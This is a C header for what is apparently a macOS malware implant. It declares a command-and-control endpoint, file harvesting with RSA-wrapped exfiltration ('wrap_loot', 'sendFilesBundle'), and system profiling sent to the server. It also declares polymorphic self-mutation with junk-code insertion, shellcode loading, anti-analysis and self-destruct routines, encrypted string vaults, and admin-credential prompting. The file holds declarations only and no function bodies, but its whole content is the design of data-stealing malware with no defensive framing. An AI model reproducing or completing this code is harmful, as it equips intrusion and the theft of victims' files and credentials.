#pragma once
#ifdef __cplusplus
extern "C" {
#endif

// ----------------------------------------
// C 
// ----------------------------------------
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <stdint.h>
#include <errno.h>
#include <signal.h>
#include <time.h>

// ----------------------------------------
// System
// ----------------------------------------
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <sys/random.h>
#include <sys/xattr.h>
#include <arpa/inet.h>
#include <libgen.h>
#include <ftw.h>
#include <grp.h>
#include <pwd.h>
#include <uuid/uuid.h>
#include <dlfcn.h>
#include <sys/sysctl.h>

// ----------------------------------------
//  Mach-O & Kernel
// ----------------------------------------
#include <mach-o/dyld.h>
#include <mach-o/loader.h>
#include <mach-o/getsect.h>
#include <mach-o/fat.h>
#include <Security/SecRandom.h>
#include <libkern/OSCacheControl.h>
#include <mach/mach_time.h>
#include <IOKit/IOKitLib.h>
#include <CoreFoundation/CoreFoundation.h>
#include <OpenDirectory/OpenDirectory.h>

// ----------------------------------------
// Crypto & Networking
// ----------------------------------------
#include <zlib.h>
#include <curl/curl.h>
#include <openssl/rsa.h>
#include <openssl/evp.h>
#include <openssl/pem.h>
#include <openssl/rand.h>
#include <openssl/aes.h>
#include <CommonCrypto/CommonCryptor.h>
#include <CommonCrypto/CommonDigest.h>

#ifdef __x86_64__
#include <immintrin.h>
#endif

#define _XOPEN_SOURCE 700
#define KEY_SIZE 32
#define SYS_Z 2
#define X86_JUNK_COUNT 10
#define JUNK_SIZE 16
#define BLOCK_SIZE 16
#define PAGE_SIZE 4096
#define MAX_FILES 1024
#define PWD 256

#ifdef TEST
#define DBG(fmt, ...) fprintf(stderr, fmt "\n", ##__VA_ARGS__)
#else
#define DBG(...) ((void)0)
#endif

#define ROTL32(x, n) (((x) << (n)) | ((x) >> (32 - (n))))
#define cipher(k,iv,in,out,len) crypt_payload(1,k,iv,in,out,len)
#define decipher(k,iv,in,out,len) crypt_payload(0,k,iv,in,out,len)

#define patch8(b,s,o,v) do{if((o)<(s))(b)[o]=(v);}while(0)
#define patch16(b,s,o,v) do{if((o)+1<(s))*((uint16_t*)&(b)[o])=(v);}while(0)
#define patch32(b,s,o,v) do{if((o)+3<(s))*((uint32_t*)&(b)[o])=(v);}while(0)

static const uint8_t *did_we_cry;
static size_t did_we_cry_size;
static bool notsafe;

//  Types 
typedef enum { OP_NONE, OP_REG, OP_MEM, OP_IMM, OP_REL } op_type_t;
typedef struct { op_type_t type; uint8_t size; union { uint8_t reg; struct { uint8_t base,index,scale; int64_t disp; } mem; uint64_t imm; }; } operand_t;
typedef struct { uint8_t raw[15],len,prefixes,rex,opcode[4],opcode_len; bool vex,evex,has_modrm,has_sib; uint8_t modrm,sib,disp_size; int64_t disp; uint8_t imm_size; uint64_t imm; bool rex_w,rex_r,rex_x,rex_b,modifies_ip,is_control_flow,valid,ring0; int64_t target; operand_t ops[3]; } x86_inst_t;
typedef struct { uint32_t raw,opcode,opcode_len; int type; int rd,rn,rm,ra; uint64_t imm; uint8_t imm_size,shift_type,shift_amount; bool is_64bit,is_signed,is_privileged,is_control_flow,modifies_ip,valid,privileged; uint8_t len; int64_t target; } arm64_inst_t;
typedef struct { uint8_t rd_reegs[8],wr_reegs[8],regs_rd,regs_wr; uint64_t mem_addr; bool mem_rd,mem_wr; uint8_t flag_rd,falg_wr; int8_t stk_adj; bool ring0,voll,can_throw; } real_sem_t;
typedef struct { uint8_t base_reg,index_reg,scale; int64_t disp; bool has_sib,rip_relative; } addr_mode_t;
typedef struct { size_t start,end,successors[4],num_successors; bool is_exit; } rec_block_t;
typedef struct { rec_block_t *blocks; size_t num_blocks,cap_blocks; bool *visited; size_t code_size; } rec_cfg_t;
typedef uint8_t (*memread_fn)(uintptr_t);

typedef struct __attribute__((packed)) { uint8_t key[KEY_SIZE],iv[kCCBlockSizeAES128]; uint64_t seed; uint32_t count; uint8_t hash[CC_SHA256_DIGEST_LENGTH]; } enc_header_t;
typedef struct { uint8_t key[KEY_SIZE],iv[16],stream[64]; size_t position; uint64_t counter; } chacha_state_t;
typedef struct { char *path; size_t size; } file_t;
typedef enum { WIPE_ZERO,WIPE_ONE,WIPE_RANDOM,WIPE_CUSTOM } wipe_pattern_t;
typedef struct { int passes; wipe_pattern_t *patterns; unsigned char custom; } wipe_conf_t;
typedef struct { char *data; size_t size; } mem_buf_t;
typedef struct { uint8_t key[KEY_SIZE],iv[16]; size_t len; uint8_t data[64]; } enc_vault_t;
typedef struct { chacha_state_t rng; } dummy_rng_t; 

typedef enum { MUT_SUB,MUT_EQUIV,MUT_PRED,MUT_DEAD,MUT_SPLIT,MUT_OBFUSC,MUT_FLATTEN,MUT_REORDER,MUT_JUNK } mutx_type_t;
typedef struct { size_t offset,length; mutx_type_t type; uint32_t gen; char des[64]; } mutx_entry_t;
typedef struct { mutx_entry_t *entries; size_t count,cap; } muttt_t;
typedef struct { uint8_t reg; size_t def_offset,last_use; bool iz_live,iz_vol; } reg_liveness_t;
typedef struct { reg_liveness_t regs[16]; size_t num_regs; } liveness_state_t;
typedef struct { size_t start,end,id,successors[4],num_successors; bool is_exit; } basic_block_t;
typedef struct { basic_block_t *blocks; size_t num_blocks,entry_block,exit_block; } cfg_t;
typedef struct { size_t *dominators, num_doms, *dominated, num_dominated; } dom_info_t;
typedef struct { size_t header,*body,body_size,*exits,exits_size; } loop_info_t;
typedef struct { size_t caller,callee,call_site; } call_edge_t;
typedef struct { call_edge_t *edges; size_t num_edges,*functions,num_functions; } call_graph_t;
typedef struct { size_t off,len; uint8_t type; bool cf,valid; uint8_t raw[16]; } instr_info_t;
typedef enum { ST_NOP=0,ST_ALU,ST_BIT,ST_MOV,ST_CMP,ST_FLOW,ST_JCC,ST_STK,ST_FLAG,ST_MEM,ST_SYS } sem_type_t;
typedef struct { uint8_t type,size,reg; int64_t disp; uint64_t imm; bool izre,izwri; } m_operand_t;
typedef struct { sem_type_t sem_type; m_operand_t ops[3]; uint8_t num_ops; bool f_out,f_in,m_out,m_in,stk_out,stk_in; uint8_t stk_adj; bool ring0,voll; } sem_meta_t;

//  Externs 
extern char C2_ENDPOINT[1024],PUBKEY_URL[1024],tmpDirectory[256],*_strings[8];
extern int fileCount;
extern struct mach_header_64 _mh_execute_header;
extern uint8_t data[sizeof(enc_header_t)+PAGE_SIZE];
extern const uint8_t dummy[];
extern const size_t len;
extern const size_t vault_count,paths_count;
#if defined(ARCH_X86)
extern const uint8_t x86_junk[][16];
#elif defined(ARCH_ARM)
extern const uint8_t arm_junk[][8];
#endif

//  Core API 
void run(void);
int main(void);
void initialize(void);

//  Crypto 
void crypt_payload(int,const uint8_t*,const uint8_t*,const uint8_t*,uint8_t*,size_t);
void chacha20_block(const uint32_t[8],uint32_t,const uint32_t[3],uint32_t[16]);
void chacha20_init(chacha_state_t*,const uint8_t*,size_t);
uint32_t chacha20_random(chacha_state_t*);

//  Mutation/Obfuscation 
void mutate(uint8_t*,size_t,chacha_state_t*,unsigned);
void mut_sh3ll(uint8_t*,size_t,chacha_state_t*,unsigned);
size_t snap_instr_len(const uint8_t*,size_t);
bool it_op(const uint8_t*);
bool it_chunk(const uint8_t*,size_t);
void xpass_swp(uint8_t*,size_t,chacha_state_t*);
void xpass_jnk(uint8_t*,size_t,chacha_state_t*);
void xpass_opq(uint8_t*,size_t,chacha_state_t*);
void xpass_rswp(uint8_t*,size_t,chacha_state_t*);

//  Mach-O / Loader 
int boot(uint8_t*,size_t,chacha_state_t*);
int cook(uint8_t*,size_t,chacha_state_t*);
void pop_shellcode(uint8_t*,size_t);
void O2(void*,const void*,size_t);
void zer0(void*,size_t);
int oprw(const char*);
void clso(int);
int reset(int);
int wrby(int,unsigned char*,size_t);
int copyFile(const char*,const char*);
unsigned char* compressData(const unsigned char*,size_t,size_t*);
int fileCollector(const char*,const struct stat*,int,struct FTW*);
void sendFilesBundle(RSA*);

//  Anti/Detection 
int scan(void);
int path_exists(const char*);
int find_self(char*,uint32_t*);
void k_ill(void);
int autodes(void);
void set_crash(void);
__attribute__((noreturn)) void panic(void);

//  Vault/Strings 
char *decrypt_path(const uint8_t*,const uint8_t*,const uint8_t*,size_t);
unsigned char *wrap_loot(const unsigned char*,size_t,size_t*,RSA*);
void initialize__strings(void);
void cleanup__strings(void);

//  Network/C2 
size_t networkWriteCallback(void*,size_t,size_t,void*);
RSA* grab_rsa(const char*);
char* fetch_past(const char*);
int from_past(const char*,char*,char*);
void overn_out(const char*,const unsigned char*,size_t);
void profiler(char*,size_t,size_t*);
void collectSystemInfo(RSA*);
void mint_uuid(char*);
int sendProfile(void);

//  Auth/User 
int auth(const char*,const char*);
int is_user_admin(const char*);
char *get_device_id(void);
char *get_current_user(void);
void request_a(void);
char *request_input(const char*);

//  Util 
int trim_newlines(uint8_t*,size_t);
char *trim_w1(char*);
void free_if_not(void*);
char *extract(const char*,const char*,const char*);
void hexdump(const uint8_t*,size_t,const char*);
int _snprintf(char*,size_t,const char*,...);
char *_strncpy(char*,const char*,size_t);
void update(void);

//  Decoders 
#if defined(ARCH_X86)
bool decode_x86(const uint8_t*, uintptr_t, x86_inst_t*, memread_fn);
bool decode_x86_withme(const uint8_t*, size_t, uintptr_t, x86_inst_t*, memread_fn);
#elif defined(ARCH_ARM)
bool decode_arm64(const uint8_t*, arm64_inst_t*);
#endif

#ifdef __cplusplus
}
#endif
